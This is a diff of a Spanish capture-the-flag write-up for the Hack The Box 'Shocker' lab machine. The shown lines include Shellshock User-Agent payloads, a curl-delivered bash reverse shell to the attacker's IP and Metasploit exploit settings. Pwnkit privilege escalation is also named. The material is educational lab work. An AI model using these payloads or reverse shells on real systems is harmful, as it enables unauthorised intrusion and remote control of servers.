@@ -17,14 +17,15 @@ tags:
   - Fuzzing
   - Remote Code Execution (RCE)
   - Reverse Shell
-  - Abusing Sudoers Privilege
+  - Privesc - Abusing Sudoers Privilege
   - Local Privilege Escalation (LPE)
+  - System Recognition (Linux)
   - Remote Command Injection (RCI)
-  - CVE-2014-6278
-  - CVE-2014-6271
+  - CVE-2014-6278 (RCI)
+  - CVE-2014-6271 (RCI)
   - BurpSuite
-  - Pwnkit - Pkexec Exploit (LPE)
-  - CVE-2021-4034
+  - Pwnkit Pkexec Exploit (LPE)
+  - Privesc - CVE-2021-4034 (Pwnkit Pkexec Exploit)
   - OSCP Style
   - Metasploit Framework
 ---
@@ -33,10 +34,12 @@ tags:
 Esta fue una máquina algo compleja porque tuve que investigar bastante, pues al hacer los escaneos no mostraba nada que me pudiera ayudar. Sin embargo, gracias al **Fuzzing** pude encontrar una linea de investigación que me llevo a descubrir el **ataque ShellShock**. Gracias a este podremos conectarnos de manera remota a la máquina y usando un archivo con privilegios Root, escalaremos privilegios.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *wappalizer*
 * *wfuzz*
 * *gobuster*
+* *searchsploit*
 * *curl*
 * *tcpdump*
 * *nc*
@@ -44,7 +47,12 @@ Herramientas utilizadas:
 * *python2*
 * *sudo*
 * *perl*
-* *metasploit framework*
+* *metasploit framework(msfconsole)*
+* *Módulo: auxiliary/scanner/http/apache_mod_cgi_bash_env*
+* *Módulo: exploit/multi/http/apache_mod_cgi_bash_env_exec*
+* *Módulo: post/multi/recon/local_exploit_suggester*
+* *Módulo: exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec*
+* *meterpreter*
 
 
 <br>
@@ -64,14 +72,14 @@ Herramientas utilizadas:
 				<li><a href="#Fuzz">Fuzzing</a></li>
 				<li><a href="#Shellshock">Ataque ShellShock</a></li>
 				<ul>
-					<li><a href="#Shellshock2">Probando Si es Vulnerable la Máquina Víctima a Ataque Shellshock</a></li>
+					<li><a href="#Shellshock2">Probando Si es Vulnerable la Máquina Víctima a Ataque ShellShock</a></li>
 				</ul>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#Shellshock3">Aplicando Ataque Shellshock</a></li>
+				<li><a href="#Shellshock3">Aplicando Ataque ShellShock</a></li>
 				<li><a href="#PruebaExp">Probando Exploit: Apache mod_cgi - 'Shellshock' Remote Command Injection</a></li>
-				<li><a href="#PruebaExp2">Aplicando Shellshock con Burpsuite</a></li>
+				<li><a href="#PruebaExp2">Aplicando Shellshock con BurpSuite</a></li>
 				<li><a href="#PruebaExp3">Usando Metasploit Framework para Aplicar Shellshock</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
@@ -92,10 +100,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -191,10 +196,7 @@ Ya sabíamos que es una página web, entonces vamos a verla.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -229,21 +231,8 @@ Total requests: 220560
 ID           Response   Lines    Word       Chars       Payload                                                                     
 =====================================================================
 
-000000001:   200        9 L      13 W       137 Ch      "# directory-list-2.3-medium.txt"                                           
-000000003:   200        9 L      13 W       137 Ch      "# Copyright 2007 James Fisher"                                             
-000000007:   200        9 L      13 W       137 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
 000000035:   403        11 L     32 W       294 Ch      "cgi-bin"                                                                   
-000000013:   200        9 L      13 W       137 Ch      "#"                                                                         
 000000014:   200        9 L      13 W       137 Ch      "http://10.10.10.56//"                                                      
-000000012:   200        9 L      13 W       137 Ch      "# on atleast 2 different hosts"                                            
-000000011:   200        9 L      13 W       137 Ch      "# Priority ordered case sensative list, where entries were found"          
-000000010:   200        9 L      13 W       137 Ch      "#"                                                                         
-000000009:   200        9 L      13 W       137 Ch      "# Suite 300, San Francisco, California, 94105, USA."                       
-000000006:   200        9 L      13 W       137 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"             
-000000008:   200        9 L      13 W       137 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                
-000000005:   200        9 L      13 W       137 Ch      "# This work is licensed under the Creative Commons"                        
-000000002:   200        9 L      13 W       137 Ch      "#"                                                                         
-000000004:   200        9 L      13 W       137 Ch      "#"                                                                         
 000000083:   403        11 L     32 W       292 Ch      "icons"                                                                     
 000045240:   200        9 L      13 W       137 Ch      "http://10.10.10.56//"                                                      
 000095524:   403        11 L     32 W       300 Ch      "server-status"                                                             
@@ -300,8 +289,7 @@ Pues toca investigar, quizá el **cgi-bin** tenga una vulnerabilidad, vamos a bu
 <h2 id="Shellshock">Ataque ShellShock</h2>
 
 Encontré algo gracias a **HackTricks**:
-
-* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
+* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi" target="_blank">HackTricks: CGI</a>
 
 Aquí se habla sobre el **ataque ShellShock**, pero ¿esto qué es?
 
@@ -312,14 +300,13 @@ Aquí se habla sobre el **ataque ShellShock**, pero ¿esto qué es?
 <br>
 
 Aquí más información importante que nos da **OWASP**:
-
-* https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf
+* <a href="https://deephacking.tech/shellshock-attack-web/" target="_blank">Shellshock Attack – Web</a>
 
 Incluso menciona que existe un script en **nmap** para detectar si una víctima, en este caso el **servidor web Apache**, es vulnerable al **ataque ShellShock**. 
 
 <br>
 
-<h3 id="Shellshock2">Probando Si es Vulnerable la Máquina Víctima a Ataque Shellshock</h3>
+<h3 id="Shellshock2">Probando Si es Vulnerable la Máquina Víctima a Ataque ShellShock</h3>
 
 Para que este funcione, debemos averiguar si existe el **directorio cgi-bin** y el archivo **user.sh**, nosotros ya encontramos el **cgi-bin** pero no el **user.sh**, veamos que pasa si lo ponemos junto al **cgi-bin** en el buscador:
 
@@ -364,9 +351,9 @@ PORT   STATE SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
 ```
-Aqui la página de **nmap** de donde saque el script:
 
-* https://nmap.org/nsedoc/scripts/http-shellshock.html
+Aqui la página de **nmap** de donde saque el script:
+* <a href="https://nmap.org/nsedoc/scripts/http-shellshock.html" target="_blank">Script http-shellshock</a>
 
 Y es vulnerable, vamos a utilizar este ataque para ganar acceso a la máquina.
 
@@ -375,19 +362,15 @@ Y es vulnerable, vamos a utilizar este ataque para ganar acceso a la máquina.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
 
-<h2 id="Shellshock3">Aplicando Ataque Shellshock</h2>
+<h2 id="Shellshock3">Aplicando Ataque ShellShock</h2>
 
 Después de leer el siguiente artículo:
-
-* https://blog.cloudflare.com/inside-shellshock/
+* <a href="https://blog.cloudflare.com/inside-shellshock/" target="_blank">Inside Shellshock: How hackers are using it to exploit systems</a>
 
 Utilizaremos la herramienta **curl** para usar el **ataque ShellShock**, hagamos una prueba:
 ```bash
@@ -453,7 +436,7 @@ listening on [any] 443 ...
 ```bash
 curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/Tu_IP/443 0>&1" 'http://10.10.10.56/cgi-bin/user.sh'
 ```
-* Aquí nos apoyamos de la siguiente página web que te genera **Reverse Shells** en casi cualquier lenguaje:  https://www.revshells.com/
+* Aquí nos apoyamos de la siguiente página web que te genera **Reverse Shells** en casi cualquier lenguaje: <a href="https://www.revshells.com/" target="_blank">Reverse Shell Generator</a>
 
 * Activamos el comando y vemos el resultado:
 ```bash
@@ -559,7 +542,7 @@ shelly
 ```
 Y listo estamos dentro.
 
-<h2 id="PruebaExp2">Aplicando Shellshock con Burpsuite</h2>
+<h2 id="PruebaExp2">Aplicando Shellshock con BurpSuite</h2>
 
 Vamos a hacer todo este proceso por pasos:
 
@@ -580,19 +563,19 @@ burpsuite &> /dev/null & disown
 <img src="/assets/images/htb-writeup-shocker/Captura4.png">
 </p>
 
-* Cambia el contenido del **User-Agent** por **User-Agent: () { :; }; echo; /usr/bin/whoami**. Es la única línea que vas a cambiar:
+* Cambia el contenido del **User-Agent** por `User-Agent: () { :; }; echo; /usr/bin/whoami`. Es la única línea que vas a cambiar:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-shocker/Captura5.png">
 </p>
 
-* Ahora prueba con: **User-Agent: () { :; }; echo; /usr/bin/id**
+* Ahora prueba con: `User-Agent: () { :; }; echo; /usr/bin/id`
 
 <p align="center">
 <img src="/assets/images/htb-writeup-shocker/Captura6.png">
 </p>
 
-* Igual prueba con el siguiente: **User-Agent: () { :; }; echo; /bin/bash -c 'whoami'**
+* Igual prueba con el siguiente: `User-Agent: () { :; }; echo; /bin/bash -c 'whoami'`
 
 <p align="center">
 <img src="/assets/images/htb-writeup-shocker/Captura7.png">
@@ -608,7 +591,7 @@ nc -nvlp 443
 listening on [any] 443 ...
 ```
 
-* Cambia el contenido del **User-Agent**, por nuestra Reverse Shell de confianza: **User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/Tu_IP/443 0>&1'**
+* Cambia el contenido del **User-Agent**, por nuestra Reverse Shell de confianza: `User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/Tu_IP/443 0>&1'`
 
 <p align="center">
 <img src="/assets/images/htb-writeup-shocker/Captura8.png">
@@ -666,8 +649,8 @@ Matching Modules
 * Vamos a usar el modulo auxiliar (el número 2), que nos indica si es vulnerable la página web:
 ```bash
 msf6 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
-msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set RHOSTS Tu_IP
-RHOSTS => Tu_IP
+msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set RHOSTS 10.10.10.56
+RHOSTS => 10.10.10.56
 msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set TARGETURI http://10.10.10.56/cgi-bin/user.sh
 TARGETURI => http://10.10.10.56/cgi-bin/user.sh
 msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > exploit
@@ -688,8 +671,8 @@ msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > use exploit/multi/http/ap
 
 * Configura el módulo:
 ```bash
-msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS Tu_IP
-RHOSTS => Tu_IP
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.10.10.56
+RHOSTS => 10.10.10.56
 msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI http://10.10.10.56/cgi-bin/user.sh
 TARGETURI => http://10.10.10.56/cgi-bin/user.sh
 msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST Tu_IP
@@ -724,10 +707,7 @@ Listo, volvimos a ganar acceso.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -761,7 +741,8 @@ Podemos ejecutar **perl** como Root, busquemos en **GTObins** si hay alguna form
 
 <h3 id="perl">Escalando Privilegios con Perl</h3>
 
-* https://gtfobins.github.io/gtfobins/perl/#sudo
+Aquí esta:
+* <a href="https://gtfobins.github.io/gtfobins/perl/#sudo" target="_blank">GTFOBins: perl</a>
 
 Si hay una forma, intentémosla:
 ```bash
@@ -914,10 +895,7 @@ Active sessions
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
 
 
@@ -935,3 +913,48 @@ Active sessions
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
